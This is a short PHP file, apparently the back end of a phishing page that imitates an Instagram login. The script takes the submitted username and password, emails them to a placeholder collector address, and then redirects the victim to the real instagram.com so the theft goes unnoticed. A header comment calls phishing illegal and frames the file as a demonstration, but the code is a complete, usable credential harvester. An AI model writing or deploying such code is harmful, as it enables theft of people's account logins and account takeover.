<!--
Phishing is very illegal!
Please do not use this in any way that will get you in trouble.
This is just to demonstrate how easily you can create a site that looks like a popular trusted site 
-->

<?php

$EmailFrom = "phish@yourdomain.com";
$EmailTo = "your_email@your_domain.com";
$Subject = "User Info";
$Name = ($_POST['username']);
$Pass = ($_POST['password']);

// prepare email body text
$Body = "";
$Body .= "User Name: ";
$Body .= $Name;
$Body .= "\n";

$Body .= "Password: ";
$Body .= $Pass;
$Body .= "\n";

// send email
$success = mail($EmailTo, $Subject, $Body, "From: <$EmailFrom>");

// redirect to page
if ($success){
  print "<meta http-equiv=\"refresh\" content=\"0;URL=http://www.instagram.com\">";
}
else{
  print "<meta http-equiv=\"refresh\" content=\"0;URL=error.htm\">";
}
?>
